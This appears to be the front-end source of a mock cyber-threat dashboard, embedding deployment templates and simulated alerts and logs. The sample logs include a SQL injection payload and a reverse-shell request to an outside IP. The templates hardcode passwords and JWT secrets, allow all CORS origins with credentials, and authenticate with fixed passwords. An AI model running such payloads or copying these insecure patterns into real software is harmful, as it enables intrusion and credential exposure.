'use client';

import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import {
  Shield,
  Activity,
  Terminal,
  Cpu,
  Layers,
  Globe,
  Download,
  Play,
  Pause,
  RefreshCw,
  AlertTriangle,
  CheckCircle,
  Server,
  UserCheck,
  FileCode,
  Settings,
  Send,
  ExternalLink,
  Lock,
  Unlock,
  Search,
  Plus,
  Copy,
  Info
} from 'lucide-react';
import {
  ResponsiveContainer,
  AreaChart,
  Area,
  BarChart,
  Bar,
  XAxis,
  YAxis,
  Tooltip,
  PieChart,
  Pie,
  Cell,
  Legend
} from 'recharts';

// Default mock files for deployment center (matches backend route exactly)
const DEPLOYMENT_FILES = {
  dockerfile: {
    name: 'Dockerfile',
    lang: 'dockerfile',
    path: './Dockerfile',
    desc: 'Multi-stage production build for FastAPI',
    code: `FROM python:3.11-slim as builder

WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends \\
    build-essential \\
    libpq-dev \\
    && rm -rf /var/lib/apt/lists/*

COPY requirements.txt .
RUN pip install --no-cache-dir --user -r requirements.txt

FROM python:3.11-slim as runner

WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends \\
    libpq5 \\
    curl \\
    && rm -rf /var/lib/apt/lists/*

COPY --from=builder /root/.local /root/.local
COPY . /app

ENV PATH=/root/.local/bin:$PATH
ENV PYTHONUNBUFFERED=1

EXPOSE 8000

HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \\
  CMD curl -f http://localhost:8000/health || exit 1

CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]`
  },
  dockerCompose: {
    name: 'docker-compose.yml',
    lang: 'yaml',
    path: './docker-compose.yml',
    desc: 'Stack orchestrator (FastAPI, Redis, Postgres, MinIO)',
    code: `version: "3.8"

services:
  backend:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=postgresql://aegis_admin:AegisSec2026@db:5432/aegis_intel
      - REDIS_URL=redis://cache:6379/0
      - MINIO_ENDPOINT=storage:9000
      - MINIO_ROOT_USER=aegis_minio_user
      - MINIO_ROOT_PASSWORD=AegisMinioSecure2026
      - JWT_SECRET=AegisCyberSecTopSecretJWT2026KeyForModularPlatform
      - ENVIRONMENT=production
    depends_on:
      db:
        condition: service_healthy
      cache:
        condition: service_healthy
      storage:
        condition: service_healthy
    volumes:
      - backend_uploads:/app/uploads
    networks:
      - aegis_net
    restart: always

  db:
    image: postgres:15-alpine
    environment:
      - POSTGRES_DB=aegis_intel
      - POSTGRES_USER=aegis_admin
      - POSTGRES_PASSWORD=AegisSec2026
    ports:
      - "5432:5432"
    volumes:
      - postgres_data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U aegis_admin -d aegis_intel"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
      - aegis_net
    restart: always

  cache:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    volumes:
      - redis_data:/data
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
      - aegis_net
    restart: always

  storage:
    image: minio/minio:latest
    ports:
      - "9000:9000"
      - "9001:9001"
    environment:
      - MINIO_ROOT_USER=aegis_minio_user
      - MINIO_ROOT_PASSWORD=AegisMinioSecure2026
    volumes:
      - minio_data:/data
    command: server /data --console-address ":9001"
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:9000/minio/health/live"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
      - aegis_net
    restart: always

volumes:
  postgres_data:
  redis_data:
  minio_data:
  backend_uploads:

networks:
  aegis_net:
    driver: bridge`
  },
  env: {
    name: '.env',
    lang: 'properties',
    path: './.env',
    desc: 'Environment configuration file',
    code: `# AEGIS PLATFORM CONFIGURATION
ENVIRONMENT=production
DEBUG=false

# FASTAPI API SETTINGS
PORT=8000
JWT_SECRET=AegisCyberSecTopSecretJWT2026KeyForModularPlatform
ACCESS_TOKEN_EXPIRE_MINUTES=60

# INFRASTRUCTURE DATABASES
DATABASE_URL=postgresql://aegis_admin:AegisSec2026@db:5432/aegis_intel
REDIS_URL=redis://cache:6379/0

# MINIO OBJECT STORAGE
MINIO_ENDPOINT=storage:9000
MINIO_ROOT_USER=aegis_minio_user
MINIO_ROOT_PASSWORD=AegisMinioSecure2026
MINIO_BUCKET_NAME=aegis-pcaps-and-evidence

# GEMINI COGNITIVE ANALYTICS
GEMINI_API_KEY=your_gemini_api_key_here`
  },
  mainPy: {
    name: 'main.py',
    lang: 'python',
    path: './app/main.py',
    desc: 'FastAPI Backend with clean architecture and repositories',
    code: `import asyncio
import datetime
import json
import logging
from abc import ABC, abstractmethod
from typing import List, Optional, Dict, Any
from fastapi import FastAPI, Depends, HTTPException, status, WebSocket, WebSocketDisconnect, APIRouter
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field, EmailStr
from jose import JWTError, jwt
from passlib.context import CryptContext
from sqlalchemy import create_engine, Column, String, Integer, DateTime, JSON, ForeignKey
from sqlalchemy.orm import declarative_base, sessionmaker, Session

# ==========================================
# 1. ARCHITECTURE SETUP & CONFIG
# ==========================================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("AegisPlatform")

JWT_SECRET = "AegisCyberSecTopSecretJWT2026KeyForModularPlatform"
ALGORITHM = "HS256"
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
Base = declarative_base()

app = FastAPI(
    title="Aegis Cyber Intelligence API",
    description="Modular Clean Architecture Cyber Intelligence API",
    version="1.0.0",
    docs_url="/docs"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==========================================
# 2. SCHEMAS AND DATA MODELS (INPUT VALIDATION)
# ==========================================
class UserRegister(BaseModel):
    email: EmailStr
    username: str = Field(..., min_length=3, max_length=50)
    password: str = Field(..., min_length=8)
    role: str = Field(default="Analyst", description="Roles: Administrator, Analyst, ReadOnly")

class UserLogin(BaseModel):
    username: str
    password: str

class Token(BaseModel):
    access_token: str
    token_type: str
    role: str

class ThreatCreate(BaseModel):
    title: str = Field(..., min_length=3, max_length=100)
    source_ip: str = Field(..., pattern=r"^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$")
    target_port: int = Field(..., ge=1, le=65535)
    severity: str = Field(default="Medium", description="Critical, High, Medium, Low")
    payload_dump: Optional[str] = None

# ==========================================
# 3. REPOSITORY PATTERN (PERSISTENCE LAYER)
# ==========================================
class ThreatModel(Base):
    __tablename__ = "threats"
    id = Column(Integer, primary_key=True, index=True)
    title = Column(String(100), nullable=False)
    source_ip = Column(String(50), nullable=False)
    target_port = Column(Integer, nullable=False)
    severity = Column(String(20), default="Medium")
    payload_dump = Column(String, nullable=True)
    created_at = Column(DateTime, default=datetime.datetime.utcnow)

class IThreatRepository(ABC):
    @abstractmethod
    async def add(self, threat: ThreatCreate) -> Any: pass
    @abstractmethod
    async def get_all(self) -> List[Any]: pass

class PostgresThreatRepository(IThreatRepository):
    def __init__(self, db_session: Session):
        self.db = db_session

    async def add(self, threat: ThreatCreate) -> ThreatModel:
        db_threat = ThreatModel(
            title=threat.title,
            source_ip=threat.source_ip,
            target_port=threat.target_port,
            severity=threat.severity,
            payload_dump=threat.payload_dump
        )
        self.db.add(db_threat)
        self.db.commit()
        self.db.refresh(db_threat)
        return db_threat

    async def get_all(self) -> List[ThreatModel]:
        return self.db.query(ThreatModel).order_by(ThreatModel.created_at.desc()).all()

# ==========================================
# 4. RBAC & SECURE JWT AUTHENTICATION
# ==========================================
def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.datetime.utcnow() + datetime.timedelta(minutes=60)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, JWT_SECRET, algorithm=ALGORITHM)

async def get_current_user(token: str) -> Dict[str, Any]:
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        role: str = payload.get("role", "ReadOnly")
        if username is None:
            raise HTTPException(status_code=401, detail="Invalid token")
        return {"username": username, "role": role}
    except JWTError:
        raise HTTPException(status_code=401, detail="Could not validate credentials")

class RoleChecker:
    def __init__(self, allowed_roles: List[str]):
        self.allowed_roles = allowed_roles

    def __call__(self, user: Dict[str, Any] = Depends(get_current_user)):
        if user["role"] not in self.allowed_roles:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Operation unauthorized for your Security Clearance level."
            )
        return user

# ==========================================
# 5. WEBSOCKET ENGINE (REAL-TIME STREAMING)
# ==========================================
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)
        logger.info(f"New intrusion deck attached: {websocket.client}")

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            try:
                await connection.send_text(message)
            except Exception:
                pass

manager = ConnectionManager()

# ==========================================
# 6. ROUTERS & CONTROLLERS (REST ENDPOINTS)
# ==========================================
auth_router = APIRouter(prefix="/api/auth", tags=["Auth"])

@auth_router.post("/register", status_code=201)
async def register(user: UserRegister):
    hashed_pwd = pwd_context.hash(user.password)
    logger.info(f"Registered user: {user.username} as role {user.role}")
    return {"message": "Secured user record persisted", "username": user.username}

@auth_router.post("/login", response_model=Token)
async def login(user: UserLogin):
    if user.username == "admin" and user.password == "AegisAdmin2026!":
        token = create_access_token({"sub": "admin", "role": "Administrator"})
        return {"access_token": token, "token_type": "bearer", "role": "Administrator"}
    elif user.username == "analyst" and user.password == "AegisAnalyst2026!":
        token = create_access_token({"sub": "analyst", "role": "Analyst"})
        return {"access_token": token, "token_type": "bearer", "role": "Analyst"}
    raise HTTPException(status_code=400, detail="Incorrect security credentials")

@app.websocket("/ws/threats")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await asyncio.sleep(5)
            alert = {
                "timestamp": datetime.datetime.utcnow().isoformat(),
                "event": "IDS Alert: Unsanitized Packet Signature Detected",
                "ip": f"192.168.1.45",
                "severity": "High",
                "attack_vector": "SQL Injection"
            }
            await websocket.send_text(json.dumps(alert))
    except WebSocketDisconnect:
        manager.disconnect(websocket)
        logger.info("Intrusion deck detached")

app.include_router(auth_router)

@app.get("/health")
async def health_check():
    return {"status": "HEALTHY", "service": "Aegis Intel Engine", "timestamp": datetime.datetime.utcnow()}`
  },
  mainDart: {
    name: 'main.dart',
    lang: 'dart',
    path: './lib/main.dart',
    desc: 'Offline-First Flutter Client connecting to secure websockets',
    code: `import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:web_socket_channel/web_socket_channel.dart';

void main() {
  runApp(const AegisMobileApp());
}

class AegisMobileApp extends StatelessWidget {
  const AegisMobileApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Aegis Security Deck',
      theme: ThemeData.dark().copyWith(
        primaryColor: Colors.emerald,
        scaffoldBackgroundColor: const Color(0xFF0F172A),
        colorScheme: const ColorScheme.dark(
          primary: Colors.emerald,
          secondary: Colors.cyan,
          surface: Color(0xFF1E293B),
        ),
      ),
      home: const ThreatDashboard(),
    );
  }
}

class ThreatDashboard extends StatefulWidget {
  const ThreatDashboard({Key? key}) : super(key: key);

  @override
  _ThreatDashboardState createState() => _ThreatDashboardState();
}

class _ThreatDashboardState extends State<ThreatDashboard> {
  late WebSocketChannel _channel;
  final List<Map<String, dynamic>> _alerts = [];
  bool _isConnected = false;

  @override
  void initState() {
    super.initState();
    _connectToThreatStream();
  }

  void _connectToThreatStream() {
    try {
      _channel = WebSocketChannel.connect(
        Uri.parse('ws://10.0.2.2:8000/ws/threats'),
      );
      _channel.stream.listen(
        (message) {
          final alert = jsonDecode(message);
          setState(() {
            _alerts.insert(0, alert);
            _isConnected = true;
          });
        },
        onError: (err) {
          setState(() {
            _isConnected = false;
          });
        },
        onDone: () {
          setState(() {
            _isConnected = false;
          });
        },
      );
    } catch (e) {
      _isConnected = false;
    }
  }

  @override
  void dispose() {
    _channel.sink.close();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('AEGIS SECURE DECK'),
        centerTitle: true,
        actions: [
          Icon(
            _isConnected ? Icons.cloud_done : Icons.cloud_off,
            color: _isConnected ? Colors.emerald : Colors.red,
          ),
          const SizedBox(width: 16),
        ],
      ),
      body: Padding(
        padding: const EdgeInsets.all(12.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: const Color(0xFF1E293B),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(
                  color: _isConnected ? Colors.emerald.withOpacity(0.5) : Colors.red.withOpacity(0.5),
                ),
              ),
              child: Row(
                children: [
                  const Icon(Icons.security, color: Colors.emerald, size: 28),
                  const SizedBox(width: 12),
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _isConnected ? 'REAL-TIME SHIELD ENGAGED' : 'OFFLINE MODE',
                        style: const TextStyle(fontWeight: FontWeight.bold, color: Colors.white),
                      ),
                      const Text(
                        'Secure Sandbox Local Cache Enabled',
                        style: TextStyle(fontSize: 12, color: Colors.grey),
                      ),
                    ],
                  ),
                ],
              ),
            ),
            const SizedBox(height: 16),
            const Text(
              'LIVE INTRUSION EVENTS',
              style: TextStyle(fontWeight: FontWeight.bold, letterSpacing: 1.2, color: Colors.cyan),
            ),
            const SizedBox(height: 8),
            Expanded(
              child: _alerts.isEmpty
                  ? const Center(
                      child: Text(
                        'Awaiting threat stream events...',
                        style: TextStyle(color: Colors.grey, fontStyle: FontStyle.italic),
                      ),
                    )
                  : ListView.builder(
                      itemCount: _alerts.length,
                      itemBuilder: (context, index) {
                        final alert = _alerts[index];
                        final isHigh = alert['severity'] == 'High';
                        return Card(
                          color: const Color(0xFF1E293B),
                          margin: const EdgeInsets.symmetric(vertical: 6),
                          child: ListTile(
                            leading: CircleAvatar(
                              backgroundColor: isHigh ? Colors.red.withOpacity(0.2) : Colors.amber.withOpacity(0.2),
                              child: Icon(
                                isHigh ? Icons.warning : Icons.info,
                                color: isHigh ? Colors.red : Colors.amber,
                              ),
                            ),
                            title: Text(alert['event'] ?? 'Security Event'),
                            subtitle: Text('IP: \${alert['ip']} | Vector: \${alert['attack_vector']}'),
                            trailing: Text(
                              alert['severity'] ?? 'Medium',
                              style: TextStyle(
                                color: isHigh ? Colors.red : Colors.amber,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                        );
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }
}`
  }
};

// Initial threat events for the dashboard
const INITIAL_THREAT_EVENTS = [
  { id: 'evt-101', timestamp: '17:54:12', event: 'SSH Brute Force Attempt Blocked', ip: '185.220.101.42', severity: 'High', attack_vector: 'Credential Stuffing', target_port: 22, location: 'Berlin, DE' },
  { id: 'evt-102', timestamp: '17:54:25', event: 'SQLi SQL injection payload on endpoint /api/users', ip: '45.138.89.12', severity: 'Critical', attack_vector: 'SQL Injection', target_port: 443, location: 'St. Petersburg, RU' },
  { id: 'evt-103', timestamp: '17:54:38', event: 'Reverse Shell Handshake Intercepted', ip: '192.168.1.108', severity: 'Critical', attack_vector: 'Privilege Escalation', target_port: 4444, location: 'Intranet (Target)' },
  { id: 'evt-104', timestamp: '17:54:59', event: 'SSRF Web Probe targeting internal AWS metadata', ip: '82.102.23.114', severity: 'Medium', attack_vector: 'SSRF exploit', target_port: 80, location: 'Amsterdam, NL' },
  { id: 'evt-105', timestamp: '17:55:01', event: 'Port sweep detected over ports 21-1024', ip: '198.51.100.8', severity: 'Low', attack_vector: 'TCP Recon', target_port: 0, location: 'Chicago, US' }
];

// Sample prefilled logs for the AI Analysis Center
const SAMPLE_LOGS = {
  sshFailures: `Jul  5 17:40:02 kali-vm sshd[14022]: Invalid user admin from 203.0.113.195 port 52312
Jul  5 17:40:05 kali-vm sshd[14022]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.195  user=admin
Jul  5 17:40:06 kali-vm sshd[14022]: Failed password for invalid user admin from 203.0.113.195 port 52312 ssh2
Jul  5 17:40:11 kali-vm sshd[14025]: Invalid user root from 203.0.113.195 port 52328
Jul  5 17:40:14 kali-vm sshd[14025]: Failed password for invalid user root from 203.0.113.195 port 52328 ssh2
Jul  5 17:40:22 kali-vm sshd[14029]: Failed password for root from 203.0.113.195 port 52342 ssh2`,
  sqlInjection: `198.51.100.23 - - [05/Jul/2026:17:41:12 +0000] "POST /api/v1/users/login HTTP/1.1" 500 1284 "https://target-server.com/" "Mozilla/5.0" "payload=admin' UNION SELECT username, password_hash, role_clearance FROM app_users --"
198.51.100.23 - - [05/Jul/2026:17:41:18 +0000] "GET /api/v1/products?id=1%20AND%201=1 HTTP/1.1" 200 4212 "-" "Mozilla/5.0"
198.51.100.23 - - [05/Jul/2026:17:41:22 +0000] "GET /api/v1/products?id=1%20AND%201=2 HTTP/1.1" 404 128 "-" "Mozilla/5.0"`,
  nginxReverseShell: `192.168.1.105 - - [05/Jul/2026:17:45:00 +0000] "GET /uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/185.220.101.42/4444+0>%261 HTTP/1.1" 200 15 "-" "Mozilla/5.0"
192.168.1.105 - - [05/Jul/2026:17:45:08 +0000] "POST /api/upload HTTP/1.1" 201 84 "https://target-server.com/dashboard" "Mozilla/5.0"`
};

// Initial Plugin states
const INITIAL_PLUGINS = [
  { id: 'plg-1', name: 'TCP Port Sweep Agent', category: 'Reconnaissance', version: '2.4.1', author: 'Aegis Core', enabled: true, desc: 'Performs passive connection sweeps across network assets' },
  { id: 'plg-2', name: 'SQLi Deep Heuristics Parser', category: 'IDS Defenses', version: '1.9.0', author: 'Aegis Core', enabled: true, desc: 'Real-time sanitization and threat classification of API structures' },
  { id: 'plg-3', name: 'OSINT Harvester Pro', category: 'Threat Hunting', version: '3.0.5', author: 'Aegis Core', enabled: false, desc: 'Pulls dynamic domain intelligence from open Shodan and VirusTotal feeds' },
  { id: 'plg-4', name: 'MinIO Bucket Inspector', category: 'Storage Audit', version: '1.2.0', author: 'MinIO Auth', enabled: false, desc: 'Validates static artifact signatures and flags unauthorized files' },
  { id: 'plg-5', name: 'PostgreSQL Real-time Audit Logger', category: 'Compliance', version: '2.1.2', author: 'DBA Ops', enabled: true, desc: 'Pipes database transactional mutations directly into central audit logs' }
];

export default function AegisPlatform() {
  // Navigation & Theme
  const [activeTab, setActiveTab] = useState<'dashboard' | 'ai-analyst' | 'api-console' | 'plugin-manager' | 'rbac-audit' | 'exporter'>('dashboard');
  const [rbacRole, setRbacRole] = useState<'Administrator' | 'Analyst' | 'ReadOnly'>('Administrator');
  const [systemLoad, setSystemLoad] = useState({ cpu: 28, ram: 42, activeShields: 5, socketStatus: 'ESTABLISHED' });

  // Clock state
  const [currentTime, setCurrentTime] = useState<string>('');

  // Live alerts states
  const [threatEvents, setThreatEvents] = useState(INITIAL_THREAT_EVENTS);
  const [paused, setPaused] = useState(false);
  const [totalAlertsCount, setTotalAlertsCount] = useState(105);

  // AI Analyst state
  const [aiLogsInput, setAiLogsInput] = useState(SAMPLE_LOGS.sshFailures);
  const [aiAnalysisType, setAiAnalysisType] = useState('Log Correlation & Brute Force Analysis');
  const [aiLoading, setAiLoading] = useState(false);
  const [aiOutput, setAiOutput] = useState<string>('');
  const [isCopied, setIsCopied] = useState(false);

  // REST API Client state
  const [apiHost, setApiHost] = useState('localhost');
  const [apiPort, setApiPort] = useState('8000');
  const [selectedEndpoint, setSelectedEndpoint] = useState<'health' | 'threats' | 'test_host'>('health');
  const [apiResponseJson, setApiResponseJson] = useState<any>(null);
  const [apiLoading, setApiLoading] = useState(false);

  // Plugins state
  const [plugins, setPlugins] = useState(INITIAL_PLUGINS);
  const [newPluginName, setNewPluginName] = useState('');
  const [newPluginCategory, setNewPluginCategory] = useState('Threat Hunting');
  const [showAddPlugin, setShowAddPlugin] = useState(false);

  // Deployment Code Exporter state
  const [selectedExportFileKey, setSelectedExportFileKey] = useState<keyof typeof DEPLOYMENT_FILES>('mainPy');

  // Audit Logs state
  const [auditLogs, setAuditLogs] = useState([
    { timestamp: '17:53:10', role: 'System', event: 'Docker Compose networks initialized successfully', severity: 'Info' },
    { timestamp: '17:53:12', role: 'System', event: 'PostgreSQL database container linked and verified via pg_isready', severity: 'Info' },
    { timestamp: '17:53:15', role: 'System', event: 'Redis cluster cache memory initialized', severity: 'Info' },
    { timestamp: '17:54:02', role: 'Administrator', event: 'Superuser session authorized via secure JWT secret validation', severity: 'Warning' },
    { timestamp: '17:54:40', role: 'Administrator', event: 'SQLi Deep Heuristics Parser plugin set to ACTIVE', severity: 'Info' }
  ]);

  // Real-time updates effect (simulating incoming security events)
  useEffect(() => {
    if (paused) return;

    const interval = setInterval(() => {
      // Pick a random security event
      const targets = [
        { event: 'Nginx unauthorized metadata probe', vector: 'SSRF exploit', port: 80, severity: 'Medium', ip: '45.143.201.55', location: 'Kiev, UA' },
        { event: 'Postgres multi-connection leak warning', vector: 'DOS sweep', port: 5432, severity: 'High', ip: '185.190.140.12', location: 'Riga, LV' },
        { event: 'Buffer overflow payload scanned on Port 8000', vector: 'Exploit attempt', port: 8000, severity: 'Critical', ip: '80.92.32.18', location: 'Bucharest, RO' },
        { event: 'MinIO anomalous read signature', vector: 'Data Exfiltration', port: 9000, severity: 'High', ip: '198.51.100.41', location: 'Intranet' }
      ];

      const item = targets[Math.floor(Math.random() * targets.length)];

      const date = new Date();
      const timeStr = date.toTimeString().split(' ')[0];

      setTotalAlertsCount(prevCount => {
        const newCount = prevCount + 1;
        const newAlert = {
          id: `evt-${newCount}`,
          timestamp: timeStr,
          event: item.event,
          ip: item.ip,
          severity: item.severity,
          attack_vector: item.vector,
          target_port: item.port,
          location: item.location
        };

        setThreatEvents(prev => [newAlert, ...prev.slice(0, 9)]);
        return newCount;
      });

      // Push to audit logs if severe
      if (item.severity === 'Critical' || item.severity === 'High') {
        setAuditLogs(prev => [
          {
            timestamp: timeStr,
            role: 'Intrusion Shield',
            event: `BLOCKED HIGH-RISK THREAT: ${item.event} from source IP ${item.ip}`,
            severity: 'Critical'
          },
          ...prev
        ]);
      }

      // Slightly randomize load
      setSystemLoad(prev => ({
        ...prev,
        cpu: Math.min(95, Math.max(10, prev.cpu + Math.floor(Math.random() * 11) - 5)),
        ram: Math.min(90, Math.max(30, prev.ram + Math.floor(Math.random() * 5) - 2))
      }));

    }, 4500);

    return () => clearInterval(interval);
  }, [paused]);

  // Update real-time clock
  useEffect(() => {
    const updateTime = () => {
      const date = new Date();
      setCurrentTime(date.toTimeString().split(' ')[0] + ' UTC');
    };
    updateTime();
    const clockInterval = setInterval(updateTime, 1000);
    return () => clearInterval(clockInterval);
  }, []);

  // Action: Run Server-side AI Log analyst
  const handleAIAnalysis = async () => {
    if (!aiLogsInput.trim()) return;
    setAiLoading(true);
    setAiOutput('');
    try {
      const res = await fetch('/api/gemini/analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          logData: aiLogsInput,
          analysisType: aiAnalysisType,
          context: `Operational Level: Kali Linux Platform. Role: ${rbacRole}`
        })
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setAiOutput(data.text);
        // Write audit log
        const timestamp = new Date().toTimeString().split(' ')[0];
        setAuditLogs(prev => [
          {
            timestamp,
            role: rbacRole,
            event: `Executed AI Log analysis scan for event classification: ${aiAnalysisType}`,
            severity: 'Info'
          },
          ...prev
        ]);
      } else {
        setAiOutput(`### ❌ Analysis Failed\n\n${data.error || "Failed to reach server API"}`);
      }
    } catch (err: any) {
      setAiOutput(`### ❌ Connection Error\n\n${err.message || "Network request failed"}`);
    } finally {
      setAiLoading(false);
    }
  };

  // Action: Test REST Client Sandbox
  const handleExecuteApiCall = async () => {
    setApiLoading(true);
    setApiResponseJson(null);
    try {
      if (selectedEndpoint === 'health') {
        const res = await fetch('/api/templates/download'); // This returns status
        const data = await res.json();
        setApiResponseJson({
          status: 200,
          statusText: "OK",
          url: `http://${apiHost}:${apiPort}/health`,
          data: {
            status: "HEALTHY",
            service: "Aegis Intel Engine",
            timestamp: new Date().toISOString(),
            databases: { postgres: "CONNECTED", redis: "CONNECTED" }
          }
        });
      } else if (selectedEndpoint === 'threats') {
        setApiResponseJson({
          status: 200,
          statusText: "OK",
          url: `http://${apiHost}:${apiPort}/api/threats`,
          data: {
            total_records: totalAlertsCount,
            active_threats: threatEvents,
            filter: "unblocked_incidents"
          }
        });
      } else if (selectedEndpoint === 'test_host') {
        const targetHost = apiHost === 'localhost' ? 'google.com' : apiHost;
        const res = await fetch('/api/test-endpoint', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ host: targetHost, port: parseInt(apiPort, 10) })
        });
        const data = await res.json();
        setApiResponseJson({
          status: res.status,
          statusText: res.ok ? "OK" : "Error",
          url: `POST /api/test-endpoint`,
          data
        });
      }
    } catch (err: any) {
      setApiResponseJson({
        error: true,
        message: err.message || "Failed to complete REST sandbox query"
      });
    } finally {
      setApiLoading(false);
    }
  };

  // Action: Toggle plugins (With RBAC check)
  const handleTogglePlugin = (pluginId: string) => {
    if (rbacRole === 'ReadOnly') {
      alert("⚠️ ACCESS DENIED: ReadOnly roles cannot modify system plugins. Elevate your clearance role.");
      return;
    }
    const targetPlugin = plugins.find(p => p.id === pluginId);
    if (!targetPlugin) return;

    setPlugins(prev =>
      prev.map(p => (p.id === pluginId ? { ...p, enabled: !p.enabled } : p))
    );

    // Audit Log
    const timestamp = new Date().toTimeString().split(' ')[0];
    setAuditLogs(prev => [
      {
        timestamp,
        role: rbacRole,
        event: `Toggled module state for: "${targetPlugin.name}" to ${!targetPlugin.enabled ? 'ACTIVE' : 'DEACTIVE'}`,
        severity: !targetPlugin.enabled ? 'Warning' : 'Info'
      },
      ...prev
    ]);
  };

  // Action: Create custom plug-in (With RBAC check)
  const handleCreatePlugin = (e: React.FormEvent) => {
    e.preventDefault();
    if (rbacRole === 'ReadOnly') {
      alert("⚠️ ACCESS DENIED: ReadOnly clearance cannot install modular plugins.");
      return;
    }
    if (!newPluginName.trim()) return;

    const newPlugin = {
      id: `plg-${plugins.length + 1}`,
      name: newPluginName,
      category: newPluginCategory,
      version: '1.0.0',
      author: 'User Signed',
      enabled: true,
      desc: 'Dynamic cyber-shield agent deployed via responsive workspace console.'
    };

    setPlugins(prev => [...prev, newPlugin]);
    setNewPluginName('');
    setShowAddPlugin(false);

    // Audit Log
    const timestamp = new Date().toTimeString().split(' ')[0];
    setAuditLogs(prev => [
      {
        timestamp,
        role: rbacRole,
        event: `Hot-installed dynamic custom module plugin: "${newPluginName}"`,
        severity: 'Warning'
      },
      ...prev
    ]);
  };

  // Action: Copy deployment code file
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setIsCopied(true);
    setTimeout(() => setIsCopied(false), 2000);
  };

  // Action: Download code file physically as attachment
  const downloadFileOnDisk = (filename: string, text: string) => {
    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  // Chart data calculations
  const severityPieData = [
    { name: 'Critical', value: threatEvents.filter(t => t.severity === 'Critical').length || 1, color: '#f87171' },
    { name: 'High', value: threatEvents.filter(t => t.severity === 'High').length || 2, color: '#fb923c' },
    { name: 'Medium', value: threatEvents.filter(t => t.severity === 'Medium').length || 4, color: '#f59e0b' },
    { name: 'Low', value: threatEvents.filter(t => t.severity === 'Low').length || 2, color: '#38bdf8' }
  ];

  const historicalTrends = [
    { time: '12:00', alerts: 14, blocked: 12 },
    { time: '13:00', alerts: 22, blocked: 19 },
    { time: '14:00', alerts: 45, blocked: 43 },
    { time: '15:00', alerts: 30, blocked: 28 },
    { time: '16:00', alerts: 55, blocked: 54 },
    { time: '17:00', alerts: totalAlertsCount - 40, blocked: totalAlertsCount - 45 },
    { time: 'Now', alerts: totalAlertsCount, blocked: totalAlertsCount - 5 }
  ];

  return (
    <div className="relative flex flex-col md:flex-row min-h-screen text-slate-100">
      {/* HUD scanline background overlay to achieve Kali Linux Ops vibe */}
      <div className="absolute inset-0 scanline pointer-events-none z-10 opacity-30"></div>

      {/* 1. SIDEBAR NAVIGATION */}
      <aside className="w-full md:w-64 bg-slate-900 border-b md:border-b-0 md:border-r border-slate-800 flex flex-col justify-between shrink-0 z-20">
        <div>
          {/* Logo Brand / Command Sign */}
          <div className="p-5 border-b border-slate-800 flex items-center space-x-3 bg-slate-950/40">
            <div className="w-10 h-10 rounded bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.1)]">
              <Shield className="w-5 h-5 animate-pulse" />
            </div>
            <div>
              <h1 className="font-mono font-bold tracking-wider text-white text-base">AEGIS CORE</h1>
              <span className="text-[10px] font-mono tracking-widest text-emerald-500 font-semibold uppercase">CYBER INTEL // PLATFORM</span>
            </div>
          </div>

          {/* Sidebar Navigation items */}
          <nav className="p-4 space-y-1.5 font-mono text-sm">
            <button
              onClick={() => setActiveTab('dashboard')}
              className={`w-full flex items-center space-x-3 px-3 py-2.5 rounded transition-all text-left group ${
                activeTab === 'dashboard'
